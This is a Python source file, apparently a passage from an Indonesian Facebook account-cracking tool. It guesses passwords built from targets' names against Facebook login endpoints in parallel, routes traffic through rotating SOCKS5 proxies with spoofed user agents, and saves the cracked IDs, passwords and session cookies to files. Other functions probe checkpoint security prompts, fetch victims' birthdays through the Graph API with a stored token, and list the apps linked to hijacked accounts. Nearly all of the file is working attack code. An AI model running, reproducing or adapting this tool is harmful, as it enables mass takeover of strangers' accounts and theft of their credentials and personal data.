				babas.submit(crack,idf,pwx,"m.facebook.com",awal)
			elif 'mbasic' in metode:
				babas.submit(crack,idf,pwx,"mbasic.facebook.com",awal)
			elif 'free' in metode:
				babas.submit(crack,idf,pwx,"free.facebook.com",awal)

			else:
				babas.submit(crack,idf,pwx,"m.facebook.com",awal)
	sleep(5)
	exit(f'\r {h_}└─ {p_}Crack selesai \n {h_}└─ {p_}Jumlah OK : {h_}{ok}\n {h_}└─ {p_}Jumlah CP : {k_}{cp} ')


def otomatis():
	global ok,cp
	print(f'\n {p_}└─ {h_}HASIL OK TERSIMPAN KE > : {sim_ok}\n {p_}└─ {k_}HASIL CP TERSIMPAN KE > : {sim_cp}\n')
	
	awal = datetime.now()
	with tred(max_workers=30) as babas:
		for akun in id:
			idf,nama = akun.split('|')[0],akun.split('|')[1].lower()
			depan = nama.split(" ")[0]
			pwx = ['bagong','sayang','bangsat','kontol']
			if len(nama)<=5:
				if len(depan)<=1 or len(depan)<=2:
					pass 
				else:
					pwx.append(depan+"123")
					pwx.append(depan+"1234")
					pwx.append(depan+"12345")
					pwx.append(depan+"123456")

			else:
				if len(depan)<=1 or len(depan)<=2:
					try:
						tengah = nama.split(" ")[1]
						if len(tengah)<=3:
							pass
						else:
							pwx.append(tengah+"123")
							pwx.append(tengah+"1234")
							pwx.append(tengah+"12345")
							pwx.append(tengah+"123456")
							pwx.append(nama)

					except:

						try:
							belakang = nama.split(' ')[2]
							if len(belakang)<=3:pass
							else:
								pwx.append(belakang+"123")
								pwx.append(belakang+"1234")
								pwx.append(belakang+"12345")
								pwx.append(belakang+"123456")
								pwx.append(nama)
						except:pwx.append(nama)

				else:
					pwx.append(nama)
					pwx.append(depan+"123")
					pwx.append(depan+"1234")
					pwx.append(depan+"12345")
					pwx.append(depan+"123456")

			if 'mobile' in metode:
				babas.submit(crack,idf,pwx,"m.facebook.com",awal)
			elif 'mbasic' in metode:
				babas.submit(crack,idf,pwx,"mbasic.facebook.com",awal)
			elif 'free' in metode:
				babas.submit(crack,idf,pwx,"free.facebook.com",awal)

			else:
				babas.submit(crack,idf,pwx,"m.facebook.com",awal)
	sleep(5)
	exit(f'\r {h_}└─ {p_}Crack selesai\n {h_}└─ {p_}Jumlah Ok : {h_}{ok} \n {h_}└─ {p_}Jumlah Cp : {k_}{cp} ')


###---[ MENU CRACK ]---###
resok = []
rescp = []

def crack(idf,pwx,url,awal):
	global loop,ok,cp
	ses = requests.Session()
	xx = open('.proxy.txt','r').read().splitlines()
	ua = random.choice(redmi)
	proxy = {'http': 'socks5://'+random.choice(xx)}
	ahir = str(datetime.now()-awal).split('.')[0]

	print(f"\r\033[95m Brute Run \033[95m [%s/%s]\033[32m OK : %s\033[93m CP : %s"%(loop,len(id),ok,cp),end=" ");sys.stdout.flush()
	
	for pw in pwx:
		try:
			ses.headers.update({"Host": url, "upgrade-insecure-requests": "1", "user-agent": "Mozilla/5.0 (Linux; U; Android 10; id-id; Redmi 8A Pro Build/QKQ1.191014.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.128 Mobile Safari/537.36 XiaoMi/Mint Browser/3.9.3", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "x-requested-with": "com.mi.globalbrowser.mini", "sec-fetch-site":  "none", "sec-fetch-mode": "navigate", "sec-fetch-user": "?1", "sec-fetch-dest": "document", "accept-encoding": "gzip, deflate", "accept-language":  "en-US;q=0.8,en;q=0.7"})

			link = ses.get(f"https://{url}/login/?app_id=1217981644879628&api_key=1217981644879628&next=https%3A%2F%2F{url}%2Ffxauth%2F%3Fapp_id%3D1217981644879628%26etoken%3DAbj6LvpDiwWsf6eJTIX2e02oaKQTl9Bf5mT1GkrnTm5DiILMWyzRpW16pYFZQ00CVAwS2cJzWJ6AVCQ_3EMsW6Z2f3Rj2AJB-Pdqp9EhLCkgZxqDxr9vlkVQ%26extra_data%3D%252Fadd%252F%253Fbackground_page%253D%25252Fconnected_experiences%25252Fcross_posting%25252F%26native_app_login_flow%3Dfbcalcomettest&skip_api_login=1&no_next_msg&hide_upsell=1&hide_language_selector=0&hide_registration=0&src=fxcal&show_accounts_center_content=1&refsrc=deprecated&_rdr").text

			date = {'lsd': re.search('name="lsd" value="(.*?)"',str(link)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"',str(link)).group(1), 'm_ts': re.search('name="m_ts" value="(.*?)"',str(link)).group(1), 'li': re.search('name="li" value="(.*?)"',str(link)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': idf, 'pass': pw, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(link)).group(1)}

			head = {"Host": url, "content-length": f"{len(str(date))}", "x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(link)).group(1), "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "accept": "*/*", "origin": f"https://{url}", "x-requested-with": "com.mi.globalbrowser.mini", "sec-fetch-site": "same-origin", "sec-fetch-mode": "cors", "sec-fetch-dest": "empty", "referer": f"https://{url}/login/?app_id=1217981644879628&api_key=1217981644879628&next=https%3A%2F%2Fm.facebook.com%2Ffxauth%2F%3Fapp_id%3D1217981644879628%26etoken%3DAbj6LvpDiwWsf6eJTIX2e02oaKQTl9Bf5mT1GkrnTm5DiILMWyzRpW16pYFZQ00CVAwS2cJzWJ6AVCQ_3EMsW6Z2f3Rj2AJB-Pdqp9EhLCkgZxqDxr9vlkVQ%26extra_data%3D%252Fadd%252F%253Fbackground_page%253D%25252Fconnected_experiences%25252Fcross_posting%25252F%26native_app_login_flow%3Dfbcalcomettest&skip_api_login=1&no_next_msg&hide_upsell=1&hide_language_selector=0&hide_registration=0&src=fxcal&show_accounts_center_content=1&refsrc=deprecated&_rdr", "accept-encoding": "gzip, deflate", "accept-language": "en-US;q=0.8,en;q=0.7"}

			bx = ses.post(f"https://{url}/login/device-based/login/async/?api_key=1217981644879628&auth_token=b4c978c6cc29df1e66058283d8bcbabe&skip_api_login=1&next=https%3A%2F%2F{url}%2Ffxauth%2F%3Fapp_id%3D1217981644879628%26etoken%3DAbj6LvpDiwWsf6eJTIX2e02oaKQTl9Bf5mT1GkrnTm5DiILMWyzRpW16pYFZQ00CVAwS2cJzWJ6AVCQ_3EMsW6Z2f3Rj2AJB-Pdqp9EhLCkgZxqDxr9vlkVQ%26extra_data%3D%252Fadd%252F%253Fbackground_page%253D%25252Fconnected_experiences%25252Fcross_posting%25252F%26native_app_login_flow%3Dfbcalcomettest&refsrc=deprecated&app_id=1217981644879628&lwv=100",data=date, headers=head,proxies=proxy)

			if "checkpoint" in ses.cookies.get_dict():
				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
				data = (f'{idf}|{pw}')
				if data in rescp:pass
				else:
					rescp.append(data)
					cp+=1
					if 'ya' in cepeh:
						cek_opsi(idf,pw,ua)
					else:

						try:
							token = open('.token.txt','r').read()
							bas = {"cookie":open('.cookie.txt','r').read()}
							ttl = ses.get(f'https://graph.facebook.com/{idf}?fields=birthday&access_token={token}',cookies=bas).json()['birthday']
							m, d, y = ttl.split('/')
							m = tete[m]

							print (f" {k_}[>] Id    : {idf}\n  └─• Pw   : {pw}\n    └─ Ttl : {d} {m} {y}")
							sapi = f'{idf}|{pw}|{d} {m} {y}'
							open('CP/'+sim_cp,'a').write(sapi+'\n')
							break

						except:

							print (f" {k_}[>] Id   : {idf}\n  └─• Pw  : {pw}\n")
							open('CP/'+sim_cp,'a').write(idf+'|'+pw+'\n')
							break

			elif "c_user" in ses.cookies.get_dict():
				kuki = convert(ses.cookies.get_dict())
				idf = re.findall('c_user=(.*);xs', kuki)[0]
				data = (f'{idf}|{pw}')
				if data in resok:pass
				else:
					resok.append(data)
					ok+=1
					open('OK/'+sim_ok,'a').write(data+'\n')

					if "coki" in akunok:
						print(f"\n%s • %s|%s %s• %s "%(H,idf,pw,warna_warni_biasa,tahunng(idf)))
						print(f"\r%s └─ • %s "%(H,kuki))
						print(f"\r\033[95m └─%s %s"%(P,ua))
						break

			else:
				continue

		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

	



###---[ CEK OPSI AKUN CP ]---###

opsi = []
def sesi(res):
	response = parser(res,'html.parser')
	form = response.find('form',{'method':'post'})
	data = {x.get('name'):x.get('value') for x in form.find_all('input',{'type':['hidden','submit']})}

	r = parser(ses.post('https://mbasic.facebook.com'+form.get('action'),data=data).text, 'html.parser')
	for i in r.find_all('option'):
		opsi.append(i.text)
	return opsi		



def cek_opsi(idf,pw,ua):
	akun = ''
	try:
		token = open('.token.txt','r').read()
		bas = {"cookie":open('.cookie.txt','r').read()}
		ttl = ses.get(f'https://graph.facebook.com/{idf}?fields=birthday&access_token={token}',cookies=bas).json()['birthday']
		m, d, y = ttl.split('/')
		m = tete[m]

		
		akun += f'print ("{k_} [>] Id   : {idf}\n  └─• Pw  : {pw}\n    └─ Ua : {ua}")'
		mek = f"{idf}|{pw}|{day} {month} {year}"
		if 'file' in detek:pass
		else:open('CP/'+sim_cp,'a').write(mek+'\n')

	except:
		month = ""
		day = ""
		year = ""

		akun += f' {k_}[>] Id   : {idf}|{pw}\n  └─ Ua : {ua} '
		if 'file' in detek:pass
		else:open('CP/'+sim_cp,'a').write(idf+'|'+pw+'\n')

	try:

		h2 = {'host':'mbasic.facebook.com','accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','accept-encoding':'gzip, deflate','accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7','cache-control':'max-age=0','origin':'https://www.facebook.com','referer':'https://www.facebook.com','sec-ch-ua':'" Not A;Brand";v="99", "Chromium";v="101"','upgrade-insecure-requests':'1','user-agent': ua}

		res = ses.get(f'https://mbasic.facebook.com/login/device-based/password/?uid={idf}&flow=login_no_pin&refsrc=deprecated&_rdr',headers=h2).text
		ress = parser(res, 'html.parser')
		form = ress.find('form',{'method':'post'})
		data2 = {x.get('name'):x.get('value') for x in form.find_all('input',{'type':['submit','hidden']})}
		data2.update({

					'email':idf,

					'pass':pw})

		res = ses.post('https://mbasic.facebook.com'+form.get('action'),data=data2,headers=h2).text
		ress = parser(res, 'html.parser')
		if 'Lihat detail login yang ditampilkan. Ini Anda?' in str(ress.find('title').text):

			akun += f'\n  └─ Tap yes '

		else:

			if(len(sesi(res))==0):

				if 'Masukkan Kode Masuk untuk Melanjutkan' in str(ress.find('title').text):

					akun += f'\n  └─ Autentikasi on'

				else:

					cok = convert(ses.cookies.get_dict())

					akun += f'  └─ Akun ok\n    └─ Cok : {cok}'

			else:

				akun += f'\n  └─ Terdapat {len(opsi)} Opsi :                     '

				o = 0

				for cp in opsi:

					o+=1

					akun += f'\n  [{kk}{o}{P}] {cp}               '

		opsi.clear()

	except Exception as e:

		akun += f'\n  └─ Pw salah/spam ip'

	print(f'\r'+ akun)

	print(f'\r                                                                       ')

		

				

###---[ CONVERT COOKIE ]---###

def convert(cookie):

	cok = ('sb=%s;datr=%s;c_user=%s;xs=%s;fr=%s'%(cookie['sb'],cookie['datr'],cookie['c_user'],cookie['xs'],cookie['fr']))

	return(str(cok))





###---[ CEK APLIKASI ]---###

#--[ convert bahasa ]--#

def language(cookie):

	try:

		url = ses.get('https://mbasic.facebook.com/language/',cookies=cookie)

		data = parser(url.text,'html.parser')

		for x in data.find_all('form',{'method':'post'}):

			if 'Bahasa Indonesia' in str(x):

				bahasa = {"fb_dtsg" : re.search('name="fb_dtsg" value="(.*?)"',str(url.text)).group(1),"jazoest" : re.search('name="jazoest" value="(.*?)"', str(url.text)).group(1),"submit"  : "Bahasa Indonesia"}

				eksekusi = ses.post('https://mbasic.facebook.com' + x['action'],data=bahasa,cookies=cookie)

	except:pass



#--[ pusat print ]--#

apk1, apk2, apk3 = [], [], []

def cek_apk(idf,pw,kuki):

	cookie = {"cookie" : kuki}

	language(cookie)

	#akun = (f' [{hh}>{P}] Userid  : {hh}{idf}{U}          \n[{hh}>{P}] Psswrd  : {hh}{pw}          {P}\n [{hh}>{P}] Cookie : {hh}{kuki}{P}')
	akun = (f' {h_}[>] Id   : {idf}\n  └─• Pw  : {pw}\n    └─ Cok : {kuki} ')

	try:		

		url = "https://mbasic.facebook.com/settings/apps/tabbed/?tab=active"

		get_active(url,cookie)

	except Exception as e:pass

	try:			

		url = "https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive"

		get_inactive(url,cookie)

	except Exception as e:pass

	try:			

		url = "https://mbasic.facebook.com/settings/apps/tabbed/?tab=removed"

		get_remove(url,cookie)

	except Exception as e:pass

	print(f'\r'+akun)

	if len(apk1)==0:pass

	else:

		akun = (f'  [>] Aplikasi Ditambahkan :                     ')

		no = 0

		for apk in apk1:

			no += 1

			akun += (f'\n    └─ {no} {apk.lower()}            ')

		print(f'\r'+akun)

	if len(apk2)==0:pass

	else:

		akun = (f'  [>] Aplikasi Kadaluwarsa :                   ')

		no = 0

		for apk in apk2:

			no += 1

			akun += (f'\n    └─ {no} {apk.lower()}             ')

		print(f'\r'+akun)

	if len(apk3)==0:pass

	else:

		akun = (f'\n  [>] Aplikasi Yang Dihapus :                  ')

		no = 0

		for apk in apk3:

			no += 1

			akun += (f'\n    └─ {no} {apk.lower()}               ')

		print(f'\r'+akun)

	apk1.clear()

	apk2.clear()

	apk3.clear()

	print(f"\r                                             ")

			

			

#--[ cek apk aktif ]--#

def get_active(url,cookie):

	try:

		data = parser(ses.get(url,cookies=cookie).content,"html.parser")

		for apk in data.find_all('h3'):

			if 'Ditambahkan' in apk.text:					

				apk1.append(f"{str(apk.text).replace('Ditambahkan',' Ditambahkan')}")

			else:continue

		next = "https://mbasic.facebook.com" + data.find('a',string='Lihat Lainnya')['href']

		get_active(next,cookie)

	except:pass



#--[ cek apk kadaluarsa ]--#

def get_inactive(url,cookie):

	try:

		data = parser(ses.get(url,cookies=cookie).content,"html.parser")

		for apk in data.find_all('h3'):

			if 'Kedaluwarsa' in apk.text:

				apk2.append(f"{str(apk.text).replace('Kedaluwarsa',' Kedaluwarsa')}")

			else:continue

		next = "https://mbasic.facebook.com" + data.find('a',string='Lihat Lainnya')['href']

		get_inactive(next,cookie)

	except:pass



#--[ cek apk dihapus ]--#		

def get_remove(url,cookie):

	try:

		data = parser(ses.get(url,cookies=cookie).content,"html.parser")

		for apk in data.find_all('h3'):

			if 'Dihapus' in apk.text:

				apk3.append(f"{str(apk.text).replace('Dihapus',' Dihapus')}")

			else:continue

		next = "https://mbasic.facebook.com" + data.find('a',string='Lihat Lainnya')['href']

		get_remove(next,cookie)

	except:pass

	
h_ = "\33[32;1m" # hijau

def ath():
	print(f"Code by Ramadhani P2")
	time.sleep(2)
def loading():
	ath()
	os.system("clear")
	time.sleep(0.05)
	print(f"{h_}Loading...")
	time.sleep(0.05)
	os.system("clear")
	print(f"{h_}lOading...")
	time.sleep(0.05)
	os.system("clear")
	print(f"{h_}loAding...")
	time.sleep(0.05)
	os.system("clear")
	print(f"{h_}loaDing...")
	time.sleep(0.05)
	os.system("clear")
	print(f"{h_}loadIng...")
	time.sleep(0.05)
	os.system("clear")
	print(f"{h_}loadiNg...")
	time.sleep(0.05)
	os.system("clear")
	print(f"{h_}loadinG...")
	time.sleep(0.05)
	os.system("clear")
def make():
	loading()
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.system('git pull')
	except:pass
	kontol()


	

if __name__=='__main__':

	make()	
#	kontol()

